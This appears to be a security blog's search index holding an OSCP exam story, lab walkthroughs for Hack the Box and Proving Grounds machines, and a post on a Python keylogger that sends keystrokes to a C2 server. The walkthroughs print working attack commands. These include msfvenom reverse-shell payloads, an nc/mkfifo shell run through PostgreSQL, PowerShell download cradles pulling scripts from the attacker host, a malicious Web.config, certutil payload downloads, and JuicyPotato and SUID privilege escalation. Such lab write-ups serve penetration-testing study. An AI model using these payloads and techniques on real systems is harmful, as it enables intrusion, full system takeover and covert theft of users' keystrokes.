[ { "title": "Journey to OSCP", "url": "/posts/Journey-to-OSCP/", "categories": "Certifications", "tags": "oscp, certifications", "date": "2022-12-30 11:00:00 -0600", "snippet": "Journey to OSCPThe First Attempt: A Humbling IntroductionEmbarking on the OSCP journey for the first time, I didn’t know what to expect. I had done the 3 months of training provided by OffSec and had completed about 30 of their lab machines. I started th test strong, scored 25 points on the buffer overflow (This was before the change to the AD-based exam), and another 10 points on the “easy” box. However, reality quickly set in as I began struggling with the sheer amount of rabbit holes. Despite my best efforts, I fell short of the passing score and only got 35/100 points. It hurt, but not enough to discourage me.The Second Attempt: Determination and GrowthUndeterred by my initial setback, I regrouped and resolved to give the OSCP another shot. Armed with newfound determination, I spent countless hours refining my skills, studying different attack techniques, and practicing on vulnerable systems. This time, I felt better equipped and confident that success was within reach. Alas, fate had other plans. While I made progress and performed better than before, I still fell short of the desired outcome. Frustration set in, but I knew I couldn’t let it consume me.The Final Triumph: Passing the OSCPAfter months of dedication, sleepless nights, and countless cups of coffee, the moment of truth arrived. Armed with both knowledge and experience, I confronted the OSCP exam with confidence and composure. This time, the challenges seemed more manageable, and I approached them methodically, leveraging the skills I had acquired over time. The hours of practice paid off as I gradually chipped away at each obstacle, gaining momentum and, eventually, reaching the finish line. The elation and relief I felt when I saw the words “Congratulations, you have passed” on my screen were indescribable.What’s Next?I’ll be taking a short break and will likely look at the Certified Red Team Professional (CRTP) certification offered by Altered Security." }, { "title": "Hack the Box - Chatterbox", "url": "/posts/Chatterbox/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-10-06 12:00:00 -0500", "snippet": "Bounty OverviewMachine Details IP Hostname Operating System 10.10.10.74 Chatterbox Windows Path to ExploitationTo complete Chatterbox we’ll start by leveraging a buffer overflow vulnerability in an outdated chat server with a publicly available exploit. Once we modify the payload in the script we’ll get a reverse shell back on our machine. To escalate our privileges, we’ll reuse a weak password that we were able to identify and gain access to the administrator account.Chatterbox EnumerationFull Port Scan$ nmap 10.10.10.74 -p- -oA Chatterbox/nmap/full-port --open -Pn -vvWhich Resulted In: PORT SERVICE 9255 mon 9256 unknown 49152 unknown 49153 unknown 49154 unknown 49155 unknown 49156 unknown 49157 unknown Service Scan$ nmap 10.10.10.74 -p 9255,9256,49152,49153,49154,49155,49156,49157 -sC -sV -oA Chatterbox/nmap/service-scan -PnWhich Resulting In: PORT SERVICE VERSION 9255 http chat system httpd 9256 achat chat system 49152 msrpc Windows RPC 49153 msrpc Windows RPC 49154 msrpc Windows RPC 49155 msrpc Windows RPC 49156 msrpc Windows RPC 49157 msrpc Windows RPC Exploiting the AChat ServerI did a simple google search of this AChat service and found a potential exploit that I could use. The exploit is a remote buffer overflow.Inside the script we see the command needed to generate the payload$ msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f pythonWe’ll need to modify this command to create a reverse shell payload instead of executing calc.exe$ msfvenom -p windows/shell_reverse_tcp -a x86 --platform Windows LHOST=10.10.14.8 LPORT=443 -e x86/unicode_mixed -b '\\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff' BufferRegister=EAX -f pythonAfter creating this payload and modifying the script with it, we can setup a nc listener and launch the exploit$ python exploit.pyChecking back on the listener we see we have a shell as alfredPrivilege EscalationRunning winpeas we identify a set of Autologon credentialsWe can try re-using this password with the administrator account using PsExec$ python /home/pharo/.local/bin/psexec.py Administrator:\"Welcome1\\!\"@10.10.10.74We can see that we now have a session running as SYSTEM." }, { "title": "Proving Grounds - Nukem", "url": "/posts/Nukem/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-09-26 12:00:00 -0500", "snippet": "Nukem OverviewMachine Details: IP Hostname Operating System 192.168.66.105 Nukem Linux Path to ExploitationNibbles is a box that requires us to attack a PostgreSQL server with weak credentials to gain access to the machine. From there, we abuse a vulnerable binary with the sticky bit (suid) to escalate to root.Nukem WebsiteLanding page indicates that wordpress is on the hostAfter creating an account I can access the wp-admin pageAble to identify version of WordPress on the hostWe run wp-scan and identify several out dated plugins and themes.We find an RCE affecting this version of simple-file-list hereShell on NukemUse this exploitmodify the payload to send a shell to our hostNeed to load the python virtual env to run the script with python3, run the following command in my home directorysource env/bin/activateSetup a listener and run the exploitpython3 Proving-Grounds/Nukem/exploit.py http://192.168.66.105Checking on our listener we see we have a reverse shellWe find the local flag in the /home/commander directoryPrivilege EscalationInteresting SUID Identified:find / -perm -u=s -type f 2&gt;/dev/nullWe identify that the VNC server is running on the internal port 5901Setup a local port forward to access the VNC server from our Kali machinessh -L 5901:127.0.0.1:5901 commander@192.168.66.105Connect to the VNC server on Kali and provide commander’s passwordvncviewer 127.0.0.1:5901We then launch the terminal application and will use the previously identified dosbox SUID binaryrun the dosbox binary to get a DOS shellmount a drive to /etcWe can test our access and see that we can read the shows file, meaning we have elevated privilegesWe can now add our current user to the sudoers fileecho commander ALL=(ALL) ALL &gt;&gt; sudoersChecking back in our SSH connection we see that our sudo permissions have been updatedsudo -lWe can now switch to the root usersudo -s" }, { "title": "Proving Grounds - Nibble", "url": "/posts/Nibbles/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-09-22 12:00:00 -0500", "snippet": "Nibbles OverviewMachine Details: IP Hostname Operating System 192.168.82.47 Nibbles Linux Path to ExploitationNibbles is a box that requires us to attack a PostgreSQL server with weak credentials to gain access to the machine. From there, we abuse a vulnerable binary with the sticky bit (suid) to escalate to root.Nibbles EnumerationFull Port ScanI ran the following command:nmap -Pn -p- 192.168.82.47 -oA nmap/full-port --openWhich resulted in the following: Port Service 21 ftp 22 ssh 80 http 5437 pmip6-data Service ScanI also ran a service scan on the found ports:nmap -Pn -p 8080,12445,18030,43022 -sC -sV -oA nmap/service-scan 192.168.82.47And found the following: Port Service Version 21 ftp vsftpd 3.0.3 22 ssh OpenSSH 7.9p1 80 http Apache httpd 2.4.38 5437 postgresql PostgreSQL DB 11.3 - 11.7 PostgreSQLDefault credentials are enabled for the DB serverpsql -h 192.168.82.125 -U postgres -p 5437Enter the password “postgres” when promptedEnumerating the DatabaseWe are logged in as the postgres user, who is also the superuserCan use the pg_read_file method to read files on the machineselect pg_read_file('/etc/passwd', 0, 100000); There are two users (excluding the root user) that have logins: wilson postgresWe can use the pg_ls_dir method to print directory contents:select pg_ls_dir('/home/wilson');So we can see that wilson is the use with the local flagShell on NibblesPostgreSQL RCEPostgreSQL RCECREATE TABLE shell(output text);COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.63 80 &gt;/tmp/f';Setup a listener to catch the shellWe already know the location of the local flag, time to grab thatPrivilege EscalationThe find binary has the SUID bit set, GTFOBins has an entry for it here: https://gtfobins.github.io/gtfobins/find/Follow the instructions from GTFOBins and run the following command/usr/bin/find . -exec /bin/sh -p \\; -quitresults in a root shell" }, { "title": "Proving Grounds - Fail", "url": "/posts/Fail/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-09-18 12:00:00 -0500", "snippet": "Fail OverviewMachine Details: IP Hostname Operating System 192.168.61.126 Fail Linux Path to ExploitationFail is a relatively simple box provided on Proving Grounds that requires us to identify the rsync share and leverage it to gain access to the machine. From there take advantage of a script file that allows us to run commands at the root user.Fail EnumerationFull Port Scannmap -p- -Pn -oA nmap/full-port --open 192.168.61.126Results: Port Service 22 ssh 873 rsync Service Scan Port Service Version 22 ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 873 rsync (protocol version 31) rsync Scansnmap -sV --script rsync-list-modules -oA nmap/rsync-scan 192.168.61.126 873Results:We find a shareRSyncWe can enumerate the share with the following command:$ rsync -av --list-only rsync://192.168.61.126/foxWe can also download the files with the following command:$ rsync -av rsync://192.168.156.126/fox ./rsyn_sharedTesting file upload$ touch test$ rsync test 192.168.x.126::fox$ rsync -av --list-only rsync://192.168.61.126/foxWe have file upload capabilities to the share.Shell on FailWe can create an SSH key pair and upload our public key to the hostCreate the authorized_keys file and upload it to the .ssh directorySSH into the host as the fox userPrivilege EscalationModify the file to contain the following command on the actionunban command line:nc -e /bin/bash 192.168.168.49.177 443Setup the nc listener and attempt several incorrect SSH attempts to trigger the commandNow wait for the service to restart and execute the unban command. We will see that we caught a reverse shell running as root." }, { "title": "Proving Grounds - Bratarina", "url": "/posts/Bratarina/", "categories": "Proving Grounds", "tags": "oscp, linux", "date": "2022-09-17 12:00:00 -0500", "snippet": "Bratarina OverviewMachine Details: IP Hostname Operating System 192.168.109.71 Bratarina Linux Path to ExploitationBratarina is a really straightforward machine that requires some basic enumeration of the identified services. In this case we exploit a vulnerable SMTP service that gain root access to the machine.Bratarina EnumerationFull Port Scannmap 192.168.109.71 -p- -oA Bratarina/nmap/full-port --open -Pn -vvWhich Resulted In: PORT SERVICE 22 ssh 25 smtp 80 http 445 microsoft-ds Service Scannmap 192.168.109.71 -p 22,25,80,445 -sC -sV -oA Bratarina/nmap/service-scan -PnWhich Resulted In: PORT SERVICE VERSION 22 ssh 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 25 smtp   80 http 1.14.0 (Ubuntu) 445 netbios-ssn smbd 4.7.6-Ubuntu (workgroup: COFFEECORP) SMTPWe see the server version is OpenSMTPD 2.0We can search for vulnerabilities that affect this version and come across the following RCE ExploitWe try launching reverse shell one-liners with no luck and decide to upload a reverse shell file to the host. We need to generate our reverse shell payloadmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.109 LPORT=445 -f elf &gt; evil.elfWe’ll start an HTTP server and upload our file to the /tmp directory on the hostpython3 exploit.py 192.168.109.71 25 \"wget 192.168.49.109/evil.elf -O /tmp/evil.elf\"We get a hit on our HTTP serverWe then change our payload to an executable, setup our listener, and launch the payloadAnd we see we get a shell running as root" }, { "title": "HTTPyLogger - A Python Keylogger", "url": "/posts/HTTPyLogger/", "categories": "Projects", "tags": "python, malware", "date": "2022-09-15 20:00:00 -0500", "snippet": "Disclaimer: This is purely for educational purposes only.HTTPyLoggerThis is my implementation of a keylogger in Python that exfiltrates the logged keystrokes via GET requests to the attacker’s C2 server. The code can be found hereSetupRun:$ pip3 install -r requirements.txtUsageRunning the script requires root access:$ sudo ./HTTPyLogger.pyChange the URL in the script to the address of the C2 server. in my case I’ll be demonstrating it with 127.0.0.1:8080.Setup the HTTP server:$ sudo python3 -m http.server 8080To generate traffic, start typing as usual. When the “Enter” key is pressed, a base64 encoded string of the logged keys will be sent to the attacker’s serverWe can now take these strings, decode them, and access the victim’s keystrokes:" }, { "title": "Hack the Box - Bounty", "url": "/posts/Bounty/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-20 12:44:00 -0500", "snippet": "Bounty OverviewMachine Details IP Hostname Operating System 10.10.10.93 Bounty Windows Path to ExploitationCompromising Bounty requires exploit a web-server that allows us to upload various file types. One of these files includes the .config extension, we can leverage this to upload a malicious Web.config file that contains a reverse shell command. After getting on the machine, we run some basic user and system enumeration commands and see that our user has the seImpersonatePrivilege enabled. We then use the Juicy Potato exploit elevate our privileges to SYSTEM.Bounty EnumerationFull Port Scannmap 10.10.10.93 -p- -oA Bounty/nmap/full-port --open -Pn -vvWhich Resulted In: PORT SERVICE 80 http Service Scannmap 10.10.10.93 -p 80 -sC -sV -oA Bounty/nmap/service-scan -PnWhich Resulting In: PORT SERVICE VERSION 80 http IIS httpd 7.5 WebsiteManually Inspecting the siteLanding page of the site:We can see the server is running IIS by inspecting the source of the pageWe see in Burp the full version is 7.5We see a potential vulnerability for this version of IIS here.Directory Bruteforcegobuster dir -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.93/ -o gobuster.out -x php,txt,aspx,asp,html$ dirb http://10.10.10.93/$ dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirsearch.out -u http://10.10.10.93/Key Findings:/aspnet_client/aspnet_client/system_web//transfer.aspx/Trace.axd/UploadedFiles/WebResource.axd?d=LER8t9aSWe get a access denied when trying to browse to the /uploadedfiles/ endpointBut find a file upload at /transfer.aspxShell on HostTargeting the File UploadWe can identify which file types are allowed by using Burp Intruder. Attempt to upload a text file and send the request to Intruder.Set the variable to the file extensionWe will use a list of common file extensions as our target list. We first need to remove the dot to prevent any issues with Burp processing themLoad the file into Burp, and start the attackWe soon see that the response length of 1350 indicates a successful uploadWe can filter by this value to see all the acceptable file extensions.We see we are able to upload .config files, following this article we see that we can exploit this to get command execution.We can use a similar Web.config file to launch our reverse shell. We’ll first want to transfer the Invoke-PowerShellTcp.ps1 script to our working directory and add the following line to the bottom of the file:Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 443We then create the following Web.config file:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=\"Read, Script, Write\"&gt; &lt;add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" /&gt; &lt;/handlers&gt; &lt;security&gt; &lt;requestFiltering&gt; &lt;fileExtensions&gt; &lt;remove fileExtension=\".config\" /&gt; &lt;/fileExtensions&gt; &lt;hiddenSegments&gt; &lt;remove segment=\"web.config\" /&gt; &lt;/hiddenSegments&gt; &lt;/requestFiltering&gt; &lt;/security&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;&lt;%@ Language=VBScript %&gt;&lt;% call Server.CreateObject(\"WSCRIPT.SHELL\").Run(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/Invoke-PowerShellTcp.ps1')\")%&gt;We add our command to the file to call back to our host, download, and execute the reverse shell payload.Upload the file to the host, setup an HTTP server and a nc listener. Then navigate to /uploadedfiles/Web.configWe see that we have a shell on the box running as the merlin userLocal EnumerationSystem InformationUser EnumerationC:\\&gt; whoami /groupsC:\\&gt; whoami /privBased on these privileges it appears that this host may be vulnerable to the Juicy Potato exploitPrivilege EscalationUpload the Juicy Potato exploitPS:\\&gt; certutil -urlcache -f http://10.10.14.4/JuicyPotato.exe C:\\tmp\\juicy.exeWe’ll re-use our powershell script and run the same command we used in the Web.config fileSetup a nc listener and execute the commandPS:\\&gt; .\\juicy.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')\" -t *Checking back on our listener we see have a shell running as SYSTEM" }, { "title": "Hack the Box - Silo", "url": "/posts/Silo/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-20 00:43:00 -0500", "snippet": "Silo OverviewMachine Details IP Hostname Operating System 10.10.10.82 Silo Windows Path to ExploitationThis was a new service to me that I had never seen before. To exploit this box, we’ll take advantage of an un-authenticated Oracle TNS listener which discloses a set of valid credentials to the database that we can use to get our foothold. Once on the box, the privilege escalation is pretty straight-forward. It’s another impersonation exploit using the juicy potato exploit.Silo EnumerationFull Port Scannmap 10.10.10.82 -p- -oA Silo/nmap/full-port --open -Pn -vvWhich Resulted In: PORT SERVICE 80 http 135 msrpc 139 netbios-ssn 445 microsoft-ds 1521 oracle 5985 wsman 8080 http-proxy 47001 winrm 49152 unknown 49153 unknown 49154 unknown 49155 unknown 49159 unknown 49160 unknown 49161 unknown 49162 unknown Service Scannmap 10.10.10.82 -p 80,135,139,445,1521,5985,8080,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sC -sV -oA Silo/nmap/service-scan -PnWhich Resulting In: PORT SERVICE VERSION 80 http IIS httpd 8.5 135 msrpc Windows RPC 139 netbios-ssn Windows netbios-ssn 445 microsoft-ds Windows Server 2008 R2 - 2012 microsoft-ds 1521 oracle-tns TNS listener 11.2.0.2.0 (unauthorized) 5985 http HTTPAPI httpd 2.0 (SSDP/UPnP) 8080 http XML DB Enterprise Edition httpd 47001 http HTTPAPI httpd 2.0 (SSDP/UPnP) 49152 msrpc Windows RPC 49153 msrpc Windows RPC 49154 msrpc Windows RPC 49155 msrpc Windows RPC 49159 oracle-tns TNS listener (requires service name) 49160 msrpc Windows RPC 49161 msrpc Windows RPC 49162 msrpc Windows RPC Enumerating Oracle TNSUsing the resources found on the following site, we can enumerate and exploit the service.PenTesting Oracle ListenerWe’ll start with SID enumeration:$ hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sidWe identify the following SIDsWe can then try to bruteforce credentials using the identified SIDs, to do this we us the odat command line tool:$ odat all -s 10.10.10.82 -p 1521 -d XEFound valid credentialsscott : tigerWe are able to login into the database now$ sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';After researching, I was unable to find anything useful in terms of interacting with the database.the odat command line tool also contains methods to execute commands remotely, we can use this feature to upload a malicious payload file.Shell on HostWe can also try uploading a payload file to the web directory with the odat command line tool.Generate the payload:$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f aspx -o evil.aspxUpload the file with the following command to place it in the web root directory:$ odat dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile \"C:\\inetpub\\wwwroot\" \"evil.aspx\" \"/home/pharo/HacktheBox/Silo/evil.aspx\" --sysdbaSetup a listener and navigate to http://10.10.10.82/evil.aspxWe see we’ve caught a shell as the defaultapppool userLocal EnumerationUser EnumerationC:\\&gt; whoami /privC:\\&gt; whoami /groupsSystem InformationWe see that we have the SeImpersonatePrivilege and the host is running on Windows Server 2012 R2 Standard. We can likely use the JuicyPotato Exploit to escalate our privileges.Privilege EscalationWe’ll use the Juicy Potato exploit. Start by generating a reverse shell payload.$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o evil.exeupload both the payload and the exploit to the machineC:\\&gt; certutil -urlcache -f http://10.10.14.2/juicypotato.exe juicypotato.exeC:\\&gt; certutil -urlcache -f http://10.10.14.2/evil.exe evil.exeBefore running the exploit we need to identify a valid CLSID. To do this we use the test_clsid.bat file and the list of CLSIDs for our host OSUpload both of the files to the host as wellC:\\&gt; certutil -urlcache -f http://10.10.14.2/test_clsid.bat test_clsid.batC:\\&gt; certutil -urlcache -f http://10.10.14.2/CLSID.list CLSID.listThe script will go through and print all the tested CLSIDs and whenever the number increases it indicates a valid CLSID. Although in my experience not all the “valid” CLSIDs actually worked.After testing several “valid” CLSIDs I found one that finally workedC:\\&gt; juicypotato.exe -l 1337 -p \"C:\\temp\\evil.exe\" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}On our listener we see we have a shell as the SYSTEM account" }, { "title": "Hack the Box - Bastard", "url": "/posts/Bastard/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-16 22:17:00 -0500", "snippet": "Bastard OverviewMachine Details IP Hostname Operating System 10.10.10.9 Bastard Windows Path to ExploitationCompromising this machine requires us to exploit a vulnerable version of a Drupal server that grants us a shell on the machine. Once we get our shell we enumerate our user and machine information and find that we have the seImpersonatePrivilege enabled. We can leverage this privilege to escalate to SYSTEM.Bastard EnumerationFull Port Scannmap 10.10.10.9 -p- -oA Bastard/nmap/full-port --open -Pn -vvResults: PORT SERVICE 80 http 135 msrpc 49154 unknown Service Scannmap 10.10.10.9 -p 80,135,49154 -sC -sV -oA Bastard/nmap/service-scan -PnResults: PORT SERVICE VERSION 80 http IIS httpd 7.5 135 msrpc Windows RPC 49154 msrpc Windows RPC WebsiteDrupeScan$ ./droopescan scan drupal -u http://10.10.10.9/We see the Drupal version is 7.54 so we can use the drupalgeddon2 exploit. We can test the exploit to see if we can get command execution$ ./drupalgeddon2.py -h http://10.10.10.9 -c 'whoami'nt authority\\iusrUse the Invoke-PowerShellTcp.ps1 script and add the following line to the bottom of the file:Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443Setup a listener and execute the following command:$ ./drupalgeddon2.py -h http://10.10.10.9 -c \"powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')\"We check on our listener and we see we have caught a reverse shell as the iuser accountPrivilege EscalationLocal EnumerationSystem EnumerationPS:\\&gt; systeminfoUser EnumerationPS:\\&gt; whoami /privWe see based on our privileges and the machine operating system that we may be able to leverage the juicy potato exploitGetting SYSTEMGenerate the reverse shell payload:$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o evil.exe Upload the juicy potato script and the reverse shell payload to the machinePS:\\&gt; certutil -urlcache -f http://10.10.14.10/juicypotato.exe juicy.exePS:\\&gt; certutil -urlcache -f http://10.10.14.10/evil.exe evil.exeSetup a listener and execute the script (Use the GetCLSID.ps1 script to identify the CLSID):PS:\\&gt; .\\juicy.exe -l 1337 -p \"C:\\temp\\evil.exe\" -t * -c \"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}\"Checking back on the listener we see we have a shell as the SYSTEM account." }, { "title": "Hack the Box - Granny", "url": "/posts/Granny/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-16 21:40:00 -0500", "snippet": "Granny OverviewMachine Details IP Hostname Operating System 10.10.10.15 Granny Windows Path to ExploitationTo compromise this machine, we initially leverage a mis-configured web server that allows uploading malicious files. We upload a reverse shell payload to get our initial foothold. To elevate our privileges, we’ll take advantage of our user’s privileges on the machine, specifically, seImpersonatePrivilege.Granny EnumerationFull Port Scannmap 10.10.10.15 -p- -oA Granny/nmap/full-port --open -Pn -vvWhich Resulted In: PORT SERVICE 80 http Service Scannmap 10.10.10.15 -p 80 -sC -sV -oA Granny/nmap/service-scan -PnWhich Resulting In: PORT SERVICE VERSION 80 http IIS httpd 6.0 WebsiteNikto Scan$ nikto -h http://10.10.10.15Results:---[SNIP]---+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server. + OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server. + OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH + OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.+ WebDAV enabled (UNLOCK PROPFIND PROPPATCH COPY MKCOL SEARCH LOCK listed as allowed)---[SNIP]---We see the PUT method is allowed and that WebDAV is enabled. We can use davtest to check if we can upload files to the site.DavTest$ davtest -u http://10.10.10.15Results:/usr/bin/davtest Summary:Created: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwxPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.phpPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.cfmPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.htmlPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.jhtmlPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.plPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.jspPUT File: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.txtExecutes: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.htmlExecutes: http://10.10.10.15/DavTestDir_PomonoNIS7dOMwx/davtest_PomonoNIS7dOMwx.txtWe see that we can upload/execute html and txt files.Shell on HostWe can use this information to create our shell payload:$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx -o evil.htmlWe can then use Cadaver to upload the payload$ cadaver http://10.10.10.15But before executing, we need to trick the server into executing our .aspx payload. We need to move our .html file to a .aspx file on the server.After browsing to our payload file, we see we have caught a reverse shell as the network service accountPrivilege EscalationOnce on the machine we enumerate our user’s privilegesC:\\&gt; whoami /privWe see the seImpersonatePrivilege is enabled. We need to check the operating system version to determine which exploit we can use.C:\\&gt; systeminfoWe see the OS version is Microsoft Server 2003, we canuse the Churrsaco exploit located hereGetting SYSTEMSetup and SMB Server on our Kali machine$ sudo impacket-smbserver share .Upload the file using the SMB serverC:\\&gt; copy \\\\10.10.14.10\\share\\churrasco.exeTest the exploit:C:\\&gt; churrasco.exe -d \"whoami\"We see our command executed as SYSTEMWe can now use the exploit to launch a reverse shell payloadCreate the payload:$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o evil.exeUpload the file to the machine:C:\\&gt; copy \\\\10.10.14.10\\share\\exil.exeExecute the payload:C:\\&gt; churrasco.exe -d \"C:\\temp\\evil.exe\"Checking our listener we see we have a shell running as SYSTEM" }, { "title": "Hack the Box - Optimum", "url": "/posts/Optimum/", "categories": "Hack the Box", "tags": "oscp, windows", "date": "2022-08-16 21:09:00 -0500", "snippet": "Optimum OverviewMachine Details IP Hostname Operating System 10.10.10.8 Optimum Windows Path to ExploitationThe path of exploitation for this machine starts with a vulnerable web-app that we leverage to gain our initial foothold. We then enumerate the machine until we identify a potential kernel exploit that could elevate our privileges, problem is, it requires a GUI. Fortunately there’s an alternative script that allows us to elevate our privileges without needed access to a GUI.Optimum EnumerationFull Port Scannmap 10.10.10.8 -p- -oA Optimum/nmap/full-port --open -Pn -vvResults: PORT SERVICE 80 http Service Scannmap 10.10.10.8 -p 80 -sC -sV -oA Optimum/nmap/service-scan -PnResults: PORT SERVICE VERSION 80 http httpd 2.3 WebsiteWe immediately see the version of the application is HttpFileServer 2.3. A simple google search reveals several available RCE’s affecting this application. We can try to launch a reverse shell using this script.Shell on HostCopy the Invoke-PowerShellTcp.ps1 script to our working directory and add the following line to the bottom of the file:Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443Host an HTTP Server:$ sudo python3 -m http.server 80Finally, setup a listener and execute the script:$ python3 exploit2.py 10.10.10.8 80 \"c:\\windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')\"We see we have caught a reverse shell running as the kostas userPrivilege EscalationEnumerating with SherlockWe can execute Sherlock.ps1 with the following command:PS:\\&gt; IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/sherlock.ps1')We see three potential Kernel exploitsWe will start with MS16-032 but are unable to get it to work since it requires access to a GUI. There is an alternative script that can be used when a GUI is not available. This script gives us the opportunity to pass commands to be executed as SYSTEM.Getting to SYSTEMUse the MS16-032 exploit PowerShell Script and append the following line to the bottom of the fileInvoke-MS16032 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')\"This will execute the privilege escalation script and tell it to run our 